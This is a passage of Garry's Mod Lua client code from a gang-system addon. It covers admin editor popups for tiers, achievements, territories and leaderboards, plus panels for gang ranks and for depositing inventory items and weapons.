				if( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups[data] ) then
					tierTable.Group = value
					backLeftPanel.RefreshInfo()
				elseif( data == "None" ) then
					tierTable.Group = nil
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidGroup" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Group" },

	}

	table.insert( actions, { BRICKS_SERVER.Func.L( "level" ), Material( "materials/bricks_server/level.png" ), function()
		BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "levelRequirementQuery" ), tierTable.Level, function( text ) 
			tierTable.Level = text
			backLeftPanel.RefreshInfo()
		end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
	end, "Level" } )
	
	backRightPanel.FillOptions( tierTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateAchievementEditor( oldAchievementTable, onSave, onCancel )
	local achievementTable = table.Copy( oldAchievementTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	local function GetNextQuery( currentQuery, k, v )
		local reqInfo = BRICKS_SERVER.DEVCONFIG.GangRewards[k].ReqInfo

		currentQuery = currentQuery+1

		if( currentQuery > #reqInfo ) then return end

		local reqInfoEntry = reqInfo[currentQuery]

		if( reqInfoEntry[2] == "string" or reqInfoEntry[2] == "integer" ) then 
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", reqInfoEntry[1] ), ((achievementTable.Rewards[k] or {})[currentQuery] or 0), function( text ) 
				achievementTable.Rewards[k] = achievementTable.Rewards[k] or {}
				achievementTable.Rewards[k][currentQuery] = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (reqInfoEntry[2] == "integer") )
		elseif( reqInfoEntry[2] == "bool" ) then 
			achievementTable.Rewards[k] = achievementTable.Rewards[k] or {}
			achievementTable.Rewards[k][currentQuery] = not achievementTable.Rewards[k][currentQuery]
			backLeftPanel.RefreshInfo()
		elseif( reqInfoEntry[2] == "table" and reqInfoEntry[3] and BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ) ) then 
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((achievementTable.Rewards[k] or {})[currentQuery] or ""), BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ), function( value, data ) 
				if( BRICKS_SERVER.Func.GetList( reqInfoEntry[3] )[data] ) then
					achievementTable.Rewards[k][currentQuery] = data

					if( reqInfoEntry[4] ) then
						local newupgradeTable = reqInfoEntry[4]( upgradeTable ) 
						if( newupgradeTable ) then
							upgradeTable = newupgradeTable
						end
					end
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end

		GetNextQuery( currentQuery, k, v )
	end

	backRightPanel.lastActionFunc = function( extraActionsCount )
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangAchievements[(achievementTable.Type or "")].ReqInfo or {} ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 15, 10, 15, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. (((achievementTable.ReqInfo or {})[k] and "TRUE") or "FALSE"), "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( (achievementTable.ReqInfo or {})[k] ) then
					draw.SimpleText( v[1] .. " - " .. (achievementTable.ReqInfo or {})[k], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w*0.5, h*0.5, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), ((achievementTable.ReqInfo or {})[k] or 0), function( text ) 
						achievementTable.ReqInfo = achievementTable.ReqInfo or {}
						achievementTable.ReqInfo[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					achievementTable.ReqInfo = achievementTable.ReqInfo or {}
					achievementTable.ReqInfo[k] = not achievementTable.ReqInfo[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((achievementTable.ReqInfo or {})[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							achievementTable.ReqInfo[k] = data

							if( v[4] ) then
								local newachievementTable = v[4]( achievementTable ) 
								if( newachievementTable ) then
									achievementTable = newachievementTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end

		backRightPanel.AddAction( { "Rewards", Material( "materials/bricks_server/more_24.png" ), false } )
	
		achievementTable.Rewards = achievementTable.Rewards or {}
		for key, val in pairs( BRICKS_SERVER.DEVCONFIG.GangRewards ) do
			backRightPanel.AddAction( { val.Name, false, function()
				GetNextQuery( 0, key, val )
			end, false, function() return val.FormatDescription( achievementTable.Rewards[key] or {} ) end } )
		end

		return table.Count( BRICKS_SERVER.DEVCONFIG.GangAchievements[(achievementTable.Type or "")].ReqInfo or {} )+1
	end

	local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangAchievements[achievementTable.Type or ""]
	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		devConfigTable = BRICKS_SERVER.DEVCONFIG.GangAchievements[achievementTable.Type or ""]
        
        if( achievementTable.Icon ) then
            BRICKS_SERVER.Func.GetImage( achievementTable.Icon, function( mat ) 
                backLeftPanel.iconMat = mat 
            end )
        end

		backLeftPanel.Name = achievementTable.Name or BRICKS_SERVER.Func.L( "gangNewAchievement" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), achievementTable.Name, function( text ) 
				achievementTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "description" ), Material( "materials/bricks_server/info.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newDescriptionQuery" ), achievementTable.Description, function( text ) 
				achievementTable.Description = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Description" },
		[3] = { BRICKS_SERVER.Func.L( "icon" ), Material( "materials/bricks_server/icon.png" ), function()
			BRICKS_SERVER.Func.MaterialRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newIconQuery" ), (achievementTable.Icon or ""), function( icon ) 
				achievementTable.Icon = icon
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Icon" },
		[4] = { BRICKS_SERVER.Func.L( "category" ), Material( "materials/bricks_server/more_24.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newCategoryQuery" ), achievementTable.Category, function( text ) 
				achievementTable.Category = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Category" },
	}

	table.insert( actions, { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
		local options = {}
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangAchievements ) do
			options[k] = v.Name
		end

		BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (achievementTable.Type or ""), options, function( value, data ) 
			if( options[data] ) then
				achievementTable.Type = data
				backLeftPanel.RefreshInfo()
				backRightPanel.FillOptions( achievementTable, actions, table.Count( BRICKS_SERVER.DEVCONFIG.GangRewards ) )
			else
				notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
			end
		end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
	end, "Type" } )
	
	backRightPanel.FillOptions( achievementTable, actions, table.Count( BRICKS_SERVER.DEVCONFIG.GangRewards ) )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateTerritoryEditor( oldTerritoryTable, onSave, onCancel )
	local territoryTable = table.Copy( oldTerritoryTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		backLeftPanel.Name = territoryTable.Name or BRICKS_SERVER.Func.L( "gangNewTerritory" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), territoryTable.Name, function( text ) 
				territoryTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "color" ), Material( "materials/bricks_server/color.png" ), function()
			BRICKS_SERVER.Func.ColorRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newColorQuery" ), territoryTable.Color, function( color ) 
				territoryTable.Color = color
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end },
		[3] = { BRICKS_SERVER.Func.L( "gangRewardTime" ), Material( "materials/bricks_server/chance.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "gangRewardTimeQuery" ), territoryTable.RewardTime, function( text ) 
				territoryTable.RewardTime = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "RewardTime" },
		[4] = { BRICKS_SERVER.Func.L( "gangRewards" ), Material( "materials/bricks_server/more_24.png" ), false }
	}

	local function GetNextQuery( currentQuery, k, v )
		local reqInfo = BRICKS_SERVER.DEVCONFIG.GangRewards[k].ReqInfo

		currentQuery = currentQuery+1

		if( currentQuery > #reqInfo ) then return end

		local reqInfoEntry = reqInfo[currentQuery]

		if( reqInfoEntry[2] == "string" or reqInfoEntry[2] == "integer" ) then 
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", reqInfoEntry[1] ), ((territoryTable.Rewards[k] or {})[currentQuery] or 0), function( text ) 
				territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
				territoryTable.Rewards[k][currentQuery] = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (reqInfoEntry[2] == "integer") )
		elseif( reqInfoEntry[2] == "bool" ) then 
			territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
			territoryTable.Rewards[k][currentQuery] = not territoryTable.Rewards[k][currentQuery]
			backLeftPanel.RefreshInfo()
		elseif( reqInfoEntry[2] == "table" and reqInfoEntry[3] and BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ) ) then 
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((territoryTable.Rewards[k] or {})[currentQuery] or ""), BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ), function( value, data ) 
				if( BRICKS_SERVER.Func.GetList( reqInfoEntry[3] )[data] ) then
					territoryTable.Rewards[k][currentQuery] = data

					if( reqInfoEntry[4] ) then
						local newupgradeTable = reqInfoEntry[4]( upgradeTable ) 
						if( newupgradeTable ) then
							upgradeTable = newupgradeTable
						end
					end
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		elseif( reqInfoEntry[2] == "custom" and reqInfoEntry[3] ) then 
			territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
			reqInfoEntry[3]( territoryTable.Rewards, k, currentQuery, (territoryTable.Rewards[k] or {})[currentQuery] or {} )
		end

		GetNextQuery( currentQuery, k, v )
	end

	territoryTable.Rewards = territoryTable.Rewards or {}
	for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangRewards ) do
		table.insert( actions, { v.Name, false, function()
			GetNextQuery( 0, k, v )
		end, false, function() return v.FormatDescription( territoryTable.Rewards[k] or {} ) end } )
	end
	
	backRightPanel.FillOptions( territoryTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateLeaderboardEditor( oldLeaderboardTable, onSave, onCancel )
	local leaderboardTable = table.Copy( oldLeaderboardTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		backLeftPanel.Name = leaderboardTable.Name or BRICKS_SERVER.Func.L( "gangNewLeaderboard" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), leaderboardTable.Name, function( text ) 
				leaderboardTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
			local options = {}
			for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangLeaderboards ) do
				options[k] = v.Name
			end
	
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (leaderboardTable.Type or ""), options, function( value, data ) 
				if( options[data] ) then
					leaderboardTable.Type = data
					backLeftPanel.RefreshInfo()
					backRightPanel.FillOptions( leaderboardTable, actions )
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Type" }
	}
	
	backRightPanel.FillOptions( leaderboardTable, actions )
	backLeftPanel.RefreshInfo()
end
--PATH addons/____bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_colsheet_ranks.lua:

local PANEL = {}

AccessorFunc( PANEL, "ActiveButton", "ActiveButton" )

function PANEL:Init()
	self.Navigation = vgui.Create( "bricks_server_scrollpanel", self )
	self.Navigation:Dock( LEFT )
	self.Navigation:SetWidth( 200 )
	self.Navigation.Paint = function( self2, w, h )
		surface.SetAlphaMultiplier( 200/255 )
		draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		surface.SetAlphaMultiplier( 1 )
	end

	self.Content = vgui.Create( "Panel", self )
	self.Content:Dock( FILL )

	self.Items = {}
end

function PANEL:UseButtonOnlyStyle()
	self.ButtonOnly = true
end

function PANEL:AddSheet( label, panel, color )

	if ( !IsValid( panel ) ) then return end

	local Sheet = {}
	Sheet.Button = vgui.Create( "DButton", self.Navigation )
	Sheet.Button.Target = panel
	Sheet.Button:Dock( TOP )
	Sheet.Button:DockMargin( 5, 0, 5, 0 )
	Sheet.Button:SetText( "" )
	Sheet.Button:SetTall( 30 )
	local changeAlpha = 0
	Sheet.Button.Paint = function( self2, w, h )
		local backColor = (isfunction( color ) and color()) or color

		if( self2:IsDown() or self2.m_bSelected ) then
			changeAlpha = math.Clamp( changeAlpha+10, 0, 50 )
		elseif( self2:IsHovered() ) then
			changeAlpha = math.Clamp( changeAlpha+10, 0, 10 )
		else
			changeAlpha = math.Clamp( changeAlpha-10, 0, 50 )
		end

		surface.SetAlphaMultiplier( changeAlpha/255 )
		draw.RoundedBox( 5, 0, 0, w, h, backColor or BRICKS_SERVER.Func.GetTheme( 4 ) )
		surface.SetAlphaMultiplier( 1 )

		draw.SimpleText( ((isfunction( label ) and label()) or label), "BRICKS_SERVER_Font20", 10, h*0.5, (backColor or BRICKS_SERVER.Func.GetTheme( 5 )), 0, TEXT_ALIGN_CENTER )
	end

	Sheet.Button.DoClick = function( self2 )
		if( not Sheet.Button.m_bSelected ) then
			changeAlpha = 0
		end

		self:SetActiveButton( Sheet.Button )
	end

	Sheet.Button.label = ((isfunction( label ) and label()) or label)

	Sheet.Panel = panel
	Sheet.Panel:SetParent( self.Content )
	Sheet.Panel:SetVisible( false )

	if ( self.ButtonOnly ) then
		Sheet.Button:SizeToContents()
	end

	table.insert( self.Items, Sheet )

	if ( !IsValid( self.ActiveButton ) ) then
		self:SetActiveButton( Sheet.Button )
	end
	
	return Sheet
end

function PANEL:Think()
	for k, v in pairs( self.Items ) do
		if( v.Think ) then
			v.Think()
		end
	end
end

function PANEL:SetActiveButton( active )
	if ( self.ActiveButton == active ) then return end

	if ( self.ActiveButton && self.ActiveButton.Target ) then
		local targetPanel = self.ActiveButton.Target
		targetPanel:SetVisible( false )
		self.ActiveButton:SetSelected( false )
		self.ActiveButton:SetToggle( false )
	end

	self.ActiveButton = active
	active.Target:SetVisible( true )
	active:SetSelected( true )
	active:SetToggle( true )

	if( active.onLoad ) then
		active.onLoad()
	end

	self.Content:InvalidateLayout()
end

function PANEL:SetActiveSheet( sheetLabel )
	if( not sheetLabel ) then return end

	for k, v in pairs( self.Items ) do
		if( v.Button and v.Button.label and v.Button.label == sheetLabel ) then
			self:SetActiveButton( v.Button )
			break
		end
	end
end

function PANEL:ClearSheets()
	self.Items = {}
	self.Navigation:Clear()
	self.Content:Clear()
end

derma.DefineControl( "bricks_server_colsheet_ranks", "", PANEL, "Panel" )

--PATH addons/____bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_gang_deposit.lua:
local PANEL = {}

function PANEL:Init()
    self:SetSize( ScrW(), ScrH() )
    self:Center()
    self:MakePopup()
    self:SetTitle( "" )
    self:SetDraggable( false )
    self:ShowCloseButton( false )

    self.mainPanel = vgui.Create( "bricks_server_dframepanel", self )
    self.mainPanel:SetHeader( BRICKS_SERVER.Func.L( "gangDepositMenu" ) )
    self.mainPanel:SetSize( ScrW()*0.5, ScrH()*0.5 )
    self.mainPanel:Center()
    self.mainPanel.onCloseFunc = function()
		self:Remove()
	end

    local spacing = 5

    function self.RefreshPanel()
        if( IsValid( self.sheet ) ) then
            self.sheet:Remove()
        end

        if( IsValid( self.cover ) ) then
            self.cover:Remove()
        end

        self.sheet = vgui.Create( "bricks_server_colsheet_top", self.mainPanel )
        self.sheet:Dock( FILL )
        self.sheet.pageClickFunc = function( page )
            self.page = page
        end

        if( BRICKS_SERVER.Func.IsSubModuleEnabled( "essentials", "inventory" ) and table.Count( LocalPlayer():BRS():GetInventory() ) > 0 ) then
            local inventoryTable = LocalPlayer():BRS():GetInventory()

            local inventoryScroll = vgui.Create( "bricks_server_scrollpanel", self.sheet )
            inventoryScroll:Dock( FILL )
            inventoryScroll:DockMargin( 10, 10, 10, 10 )
            inventoryScroll.Paint = function( self, w, h ) end 
            self.sheet:AddSheet( BRICKS_SERVER.Func.L( "inventory" ), inventoryScroll, ((self.page or "") == BRICKS_SERVER.Func.L( "inventory" )) )

            local inventoryGrid = vgui.Create( "DIconLayout", inventoryScroll )
            inventoryGrid:Dock( FILL )
            inventoryGrid:SetSpaceY( spacing )
            inventoryGrid:SetSpaceX( spacing )

            self:FillItems( inventoryTable, inventoryGrid, function( key, val )
                local itemInfo = {}
                if( BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo ) then
                    itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo( val[2] )
                else
                    itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( val[2] )
                end
    
                BRICKS_SERVER.Func.Query( BRICKS_SERVER.Func.L( "gangDepositInventoryQuery", itemInfo[1] ), BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ), function() 
                    net.Start( "BRS.Net.GangDepositInventory" )
                        net.WriteUInt( key, 10 )
                    net.SendToServer()
                end )
            end, function( key, val ) return not inventoryTable[key] end )
        end

        local playerInventory = {}

		local def_job_wep = util.TableToJSON( rp.Team[LocalPlayer():Team()].Weapons )
        for k, v in pairs( LocalPlayer():GetWeapons() ) do
            if v:GetClass() ~= nil and v:GetClass():find( 'm9k' ) or v:GetClass():find( 'hl2' ) then
                if (v:GetModel() or "") == "" or def_job_wep:find( v:GetClass() ) then continue end
                --
                table.insert( playerInventory, { 1, { "spawned_weapon", v:GetModel(), v:GetClass() } } )
            end
        end

        if( table.Count( playerInventory ) > 0 ) then
            local playerScroll = vgui.Create( "bricks_server_scrollpanel", self.sheet )
            playerScroll:Dock( FILL )
            playerScroll:DockMargin( 10, 10, 10, 10 )
            playerScroll.Paint = function( self, w, h ) end 
            self.sheet:AddSheet( BRICKS_SERVER.Func.L( "player" ), playerScroll, ((self.page or "") == BRICKS_SERVER.Func.L( "player" )) )

            local playerGrid = vgui.Create( "DIconLayout", playerScroll )
            playerGrid:Dock( FILL )
            playerGrid:SetSpaceY( spacing )
            playerGrid:SetSpaceX( spacing )

            self:FillItems( playerInventory, playerGrid, function( key, val )
                local itemInfo = {}
                if( BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo ) then
                    itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((val or {})[2] or {})[1] or "" ).GetInfo( val[2] )
                else
                    itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( val[2] )
                end

                BRICKS_SERVER.Func.Query( BRICKS_SERVER.Func.L( "gangDepositPlayerQuery", itemInfo[1] ), BRICKS_SERVER.Func.L( "gang" ), BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ), function() 
                    net.Start( "BRS.Net.GangDepositLoadout" )
                        net.WriteString( val[2][3] )
                    net.SendToServer()
                end )
            end, function( key, val ) return not LocalPlayer():HasWeapon( val[2][3] ) end )
        end

        if( #self.sheet.Items <= 0 ) then
            self.sheet:Remove()

            self.cover = vgui.Create( "DPanel", self.mainPanel )
            self.cover:Dock( FILL )
            self.cover.Paint = function( self2, w, h )
                draw.SimpleText( BRICKS_SERVER.Func.L( "gangNoDepositItems" ), "BRICKS_SERVER_Font25", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
            end
        end
    end
    self.RefreshPanel()
end

local gradient = Material( "vgui/gradient_up" ) 
function PANEL:FillItems( items, grid, depositFunc, refreshFunc )
    local spacing = 5
    local gridWide = self.mainPanel:GetWide()-20
    local wantedSlotSize = 125
    local slotsWide = math.floor( gridWide/wantedSlotSize )
    local slotSize = (gridWide-((slotsWide-1)*spacing))/slotsWide

    for k, v in pairs( items ) do
        local slotBack = grid:Add( "DPanel" )
        slotBack:SetSize( slotSize, slotSize )
        local x, y, w, h = 0, 0, slotSize, slotSize
        local itemModel
        local changeAlpha = 0
        local itemInfo = {}
        if( BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).GetInfo ) then
            itemInfo = BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).GetInfo( v[2] )
        else
            itemInfo = BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.GetInfo( v[2] )
        end
        
        local tooltipInfo = {}
        tooltipInfo[1] = { itemInfo[1], false, "BRICKS_SERVER_Font23B" }
        local rarityInfo
        if( itemInfo[3] ) then
            rarityInfo = BRICKS_SERVER.Func.GetRarityInfo( itemInfo[3] )
            tooltipInfo[2] = { itemInfo[3], function() return BRICKS_SERVER.Func.GetRarityColor( rarityInfo ) end, "BRICKS_SERVER_Font17" }
        end
        table.insert( tooltipInfo, itemInfo[2] )
        if( #itemInfo > 3 ) then
            for i = 4, #itemInfo do
                table.insert( tooltipInfo, itemInfo[i] )
            end
        end

        slotBack.Paint = function( self2, w, h )
            local toScreenX, toScreenY = self2:LocalToScreen( 0, 0 )
            if( x != toScreenX or y != toScreenY ) then
                x, y = toScreenX, toScreenY
                itemModel:SetBRSToolTip( x, y, w, h, tooltipInfo )
            end

            draw.RoundedBox( 8, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
            
            if( itemModel:IsDown() ) then
                changeAlpha = 0
            elseif( itemModel:IsHovered() ) then
                changeAlpha = math.Clamp( changeAlpha+10, 0, 50 )
            else
                changeAlpha = math.Clamp( changeAlpha-10, 0, 50 )
            end

            surface.SetAlphaMultiplier( changeAlpha/255 )
            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0 ) )
            surface.SetAlphaMultiplier( 1 )

            if( (v[1] or 1) > 1 ) then
                draw.SimpleText( "x" .. (v[1] or 1), "BRICKS_SERVER_Font20B", w-12, h-7, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM )
            end
        end
        slotBack.Think = function()
            if( refreshFunc ) then
                local refresh = refreshFunc( k, v )

                if( refresh ) then
                    self.RefreshPanel()
                end
            end
        end

        if( rarityInfo ) then
            local rarityBox = vgui.Create( "bricks_server_raritybox", slotBack )
            rarityBox:SetSize( slotBack:GetWide(), 5 )
            rarityBox:SetPos( 0, slotBack:GetTall()-rarityBox:GetTall() )
            rarityBox:SetRarityName( rarityInfo[1] )
            rarityBox:SetCornerRadius( 8 )
            rarityBox:SetRoundedBoxDimensions( false, -15, false, 20 )
        end

        itemModel = vgui.Create( "DModelPanel" , slotBack )
        itemModel:Dock( FILL )
        itemModel:SetModel( ((v or {})[2] or {})[2] or "models/error.mdl" )
        itemModel:SetFOV( 50 )
        function itemModel:LayoutEntity( Entity ) return end

        if( BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).ModelDisplay ) then
            BRICKS_SERVER.Func.GetInvTypeCFG( ((v or {})[2] or {})[1] or "" ).ModelDisplay( itemModel, v[2] )
        else
            BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs.ModelDisplay( itemModel, v[2] )
        end

        itemModel.DoClick = function()
            depositFunc( k, v )
        end
    end
end

function PANEL:Paint( w, h )
    BRICKS_SERVER.Func.DrawBlur( self, 4, 4 )
end

vgui.Register( "bricks_server_gang_deposit", PANEL, "DFrame" )
--PATH addons/____bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_gangmenu_create.lua:
local PANEL = {}

function PANEL:Init()
    self.animMultiplier = 0
